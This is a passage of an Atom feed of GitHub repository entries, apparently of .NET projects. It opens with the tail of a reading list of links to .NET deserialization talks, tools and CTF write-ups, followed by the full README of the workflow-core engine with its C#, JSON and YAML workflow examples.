href=&#34;https://speakerdeck.com/pwntester/attacking-net-serialization&#34;&gt;https://speakerdeck.com/pwntester/attacking-net-serialization&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints&#34;&gt;https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gosecure.github.io/presentations/2018-03-18-confoo_mtl/Security_boot_camp_for_.NET_developers_Confoo_v2.pdf&#34;&gt;https://gosecure.github.io/presentations/2018-03-18-confoo_mtl/Security_boot_camp_for_.NET_developers_Confoo_v2.pdf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf&#34;&gt;https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nullcon.net/website/archives/pdf/goa-2018/rohit-slides.pdf&#34;&gt;https://nullcon.net/website/archives/pdf/goa-2018/rohit-slides.pdf&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Tools:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/pwntester/ViewStatePayloadGenerator&#34;&gt;https://github.com/pwntester/ViewStatePayloadGenerator&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/0xACB/viewgen&#34;&gt;https://github.com/0xACB/viewgen&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Illuminopi/RCEvil.NET&#34;&gt;https://github.com/Illuminopi/RCEvil.NET&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;CTF write-ups:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cyku.tw/ctf-hitcon-2018-why-so-serials/&#34;&gt;https://cyku.tw/ctf-hitcon-2018-why-so-serials/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/3019&#34;&gt;https://xz.aliyun.com/t/3019&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>danielgerlag/workflow-core</title>
    <updated>2022-07-22T01:36:41Z</updated>
    <id>tag:github.com,2022-07-22:/danielgerlag/workflow-core</id>
    <link href="https://github.com/danielgerlag/workflow-core" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Lightweight workflow engine for .NET Standard&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Workflow Core&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://ci.appveyor.com/project/danielgerlag/workflow-core&#34;&gt;&lt;img src=&#34;https://ci.appveyor.com/api/projects/status/xnby6p5v4ur04u76?svg=true&#34; alt=&#34;Build status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Workflow Core is a light weight embeddable workflow engine targeting .NET Standard. Think: long running processes with multiple tasks that need to track state. It supports pluggable persistence and concurrency providers to allow for multi-node clusters.&lt;/p&gt; &#xA;&lt;h3&gt;Announcements&lt;/h3&gt; &#xA;&lt;h4&gt;New related project: Conductor&lt;/h4&gt; &#xA;&lt;p&gt;Conductor is a stand-alone workflow server as opposed to a library that uses Workflow Core internally. It exposes an API that allows you to store workflow definitions, track running workflows, manage events and define custom steps and scripts for usage in your workflows.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/danielgerlag/conductor&#34;&gt;https://github.com/danielgerlag/conductor&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://workflow-core.readthedocs.io&#34;&gt;Tutorial here.&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Fluent API&lt;/h2&gt; &#xA;&lt;p&gt;Define your workflows with the fluent API.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c#&#34;&gt;public class MyWorkflow : IWorkflow&#xA;{&#xA;    public void Build(IWorkflowBuilder&amp;lt;MyData&amp;gt; builder)&#xA;    {    &#xA;        builder&#xA;           .StartWith&amp;lt;Task1&amp;gt;()&#xA;           .Then&amp;lt;Task2&amp;gt;()&#xA;           .Then&amp;lt;Task3&amp;gt;();&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;JSON / YAML Workflow Definitions&lt;/h2&gt; &#xA;&lt;p&gt;Define your workflows in JSON or YAML, need to install WorkFlowCore.DSL&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;Id&#34;: &#34;HelloWorld&#34;,&#xA;  &#34;Version&#34;: 1,&#xA;  &#34;Steps&#34;: [&#xA;    {&#xA;      &#34;Id&#34;: &#34;Hello&#34;,&#xA;      &#34;StepType&#34;: &#34;MyApp.HelloWorld, MyApp&#34;,&#xA;      &#34;NextStepId&#34;: &#34;Bye&#34;&#xA;    },        &#xA;    {&#xA;      &#34;Id&#34;: &#34;Bye&#34;,&#xA;      &#34;StepType&#34;: &#34;MyApp.GoodbyeWorld, MyApp&#34;&#xA;    }&#xA;  ]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;Id: HelloWorld&#xA;Version: 1&#xA;Steps:&#xA;- Id: Hello&#xA;  StepType: MyApp.HelloWorld, MyApp&#xA;  NextStepId: Bye&#xA;- Id: Bye&#xA;  StepType: MyApp.GoodbyeWorld, MyApp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Sample use cases&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;New user workflow&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c#&#34;&gt;public class MyData&#xA;{&#xA;&#x9;public string Email { get; set; }&#xA;&#x9;public string Password { get; set; }&#xA;&#x9;public string UserId { get; set; }&#xA;}&#xA;&#xA;public class MyWorkflow : IWorkflow&#xA;{&#xA;    public void Build(IWorkflowBuilder&amp;lt;MyData&amp;gt; builder)&#xA;    {    &#xA;        builder&#xA;            .StartWith&amp;lt;CreateUser&amp;gt;()&#xA;                .Input(step =&amp;gt; step.Email, data =&amp;gt; data.Email)&#xA;                .Input(step =&amp;gt; step.Password, data =&amp;gt; data.Password)&#xA;                .Output(data =&amp;gt; data.UserId, step =&amp;gt; step.UserId)&#xA;           .Then&amp;lt;SendConfirmationEmail&amp;gt;()&#xA;               .WaitFor(&#34;confirmation&#34;, data =&amp;gt; data.UserId)&#xA;           .Then&amp;lt;UpdateUser&amp;gt;()&#xA;               .Input(step =&amp;gt; step.UserId, data =&amp;gt; data.UserId);&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Saga Transactions&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c#&#34;&gt;public class MyWorkflow : IWorkflow&#xA;{&#xA;    public void Build(IWorkflowBuilder&amp;lt;MyData&amp;gt; builder)&#xA;    {    &#xA;        builder&#xA;            .StartWith&amp;lt;CreateCustomer&amp;gt;()&#xA;            .Then&amp;lt;PushToSalesforce&amp;gt;()&#xA;                .OnError(WorkflowErrorHandling.Retry, TimeSpan.FromMinutes(10))&#xA;            .Then&amp;lt;PushToERP&amp;gt;()&#xA;                .OnError(WorkflowErrorHandling.Retry, TimeSpan.FromMinutes(10));&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c#&#34;&gt;builder&#xA;    .StartWith&amp;lt;LogStart&amp;gt;()&#xA;    .Saga(saga =&amp;gt; saga&#xA;        .StartWith&amp;lt;Task1&amp;gt;()&#xA;            .CompensateWith&amp;lt;UndoTask1&amp;gt;()&#xA;        .Then&amp;lt;Task2&amp;gt;()&#xA;            .CompensateWith&amp;lt;UndoTask2&amp;gt;()&#xA;        .Then&amp;lt;Task3&amp;gt;()&#xA;            .CompensateWith&amp;lt;UndoTask3&amp;gt;()&#xA;    )&#xA;    .OnError(Models.WorkflowErrorHandling.Retry, TimeSpan.FromMinutes(10))&#xA;    .Then&amp;lt;LogEnd&amp;gt;();&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Persistence&lt;/h2&gt; &#xA;&lt;p&gt;Since workflows are typically long running processes, they will need to be persisted to storage between steps. There are several persistence providers available as separate Nuget packages.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;MemoryPersistenceProvider &lt;em&gt;(Default provider, for demo and testing purposes)&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/providers/WorkflowCore.Persistence.MongoDB&#34;&gt;MongoDB&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/providers/WorkflowCore.Providers.Azure&#34;&gt;Cosmos DB&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/providers/WorkflowCore.Providers.AWS&#34;&gt;Amazon DynamoDB&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/providers/WorkflowCore.Persistence.SqlServer&#34;&gt;SQL Server&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/providers/WorkflowCore.Persistence.PostgreSQL&#34;&gt;PostgreSQL&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/providers/WorkflowCore.Persistence.Sqlite&#34;&gt;Sqlite&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/providers/WorkflowCore.Persistence.MySQL&#34;&gt;MySQL&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/providers/WorkflowCore.Providers.Redis&#34;&gt;Redis&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Search&lt;/h2&gt; &#xA;&lt;p&gt;A search index provider can be plugged in to Workflow Core, enabling you to index your workflows and search against the data and state of them. These are also available as separate Nuget packages.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/providers/WorkflowCore.Providers.Elasticsearch&#34;&gt;Elasticsearch&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Extensions&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/extensions/WorkflowCore.Users&#34;&gt;User (human) workflows&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Samples&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample01&#34;&gt;Hello World&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample12&#34;&gt;Multiple outcomes&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample03&#34;&gt;Passing Data&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample09&#34;&gt;Parallel ForEach&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample09s&#34;&gt;Sync ForEach&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample10&#34;&gt;While Loop&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample11&#34;&gt;If Statement&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample04&#34;&gt;Events&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample18&#34;&gt;Activity Workers&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample13&#34;&gt;Parallel Tasks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample17&#34;&gt;Saga Transactions (with compensation)&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample16&#34;&gt;Scheduled Background Tasks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample14&#34;&gt;Recurring Background Tasks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample15&#34;&gt;Dependency Injection&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample05&#34;&gt;Deferred execution &amp;amp; re-entrant steps&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample02&#34;&gt;Looping&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WebApiSample&#34;&gt;Exposing a REST API&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.Sample08&#34;&gt;Human(User) Workflow&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/src/samples/WorkflowCore.TestSample01&#34;&gt;Testing&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributors&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Daniel Gerlag&lt;/strong&gt; - &lt;em&gt;Initial work&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Jackie Ja&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Aaron Scribner&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Roberto Paterlini&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Related Projects&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/danielgerlag/conductor&#34;&gt;Conductor&lt;/a&gt; (Stand-alone workflow server built on Workflow Core)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Ports&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/danielgerlag/jworkflow&#34;&gt;JWorkflow (Java)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/danielgerlag/workflow-es&#34;&gt;workflow-es (Node.js)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/danielgerlag/liteflow&#34;&gt;liteflow (Python)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This project is licensed under the MIT License - see the &lt;a href=&#34;https://raw.githubusercontent.com/danielgerlag/workflow-core/master/LICENSE.md&#34;&gt;LICENSE.md&lt;/a&gt; file for details&lt;/p&gt;</summary>
  </entry>
</feed>